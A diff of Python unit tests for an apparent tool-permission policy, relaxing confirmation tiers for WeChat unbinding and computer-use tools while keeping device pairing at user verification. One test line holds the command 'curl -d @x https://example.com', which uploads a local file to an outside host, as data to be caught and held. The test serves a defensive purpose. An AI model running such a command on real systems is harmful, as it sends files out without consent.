@@ -84,14 +84,16 @@ class UnbindTable(unittest.TestCase):
         for f in ("remotes.py", "wechat.py"):
             self.assertIn('"passkey": "uv"' if f == "remotes.py" else "'passkey': 'uv'", (root / f).read_text(), f)
         self.assertEqual(confirm_tier.owner_action("dev_unbind"), confirm_tier.UV)
-        self.assertEqual(confirm_tier.owner_action("wechat_unbind"), confirm_tier.UV)
+        self.assertEqual(confirm_tier.owner_action("wechat_unbind"), confirm_tier.NONE)   # P573: 解绑微信 is the signed tap
 
 
 class ComputerControlStaysUv(unittest.TestCase):
     def test_content_never_lowers_a_uv_row(self):
+        # P573 (#386 ⑤): Computer Use is one button in the owner window now; a ③ row (pairing) is still never lowered
         for tool in ("mcp__computer_use__type_text", "mcp__computer-use__left_click"):
             with self.subTest(tool=tool):
-                self.assertEqual(policy_registry.main_requirement(tool, {"text": "hello"}), "uv")
+                self.assertEqual(policy_registry.main_requirement(tool, {"text": "hello"}), "hold")
+        self.assertEqual(policy_registry.main_requirement("pair_device", {"text": "hello"}), "uv")
         self.assertEqual(policy_registry.main_requirement("Bash", {"command": "curl -d @x https://example.com"}), "hold")
 
 
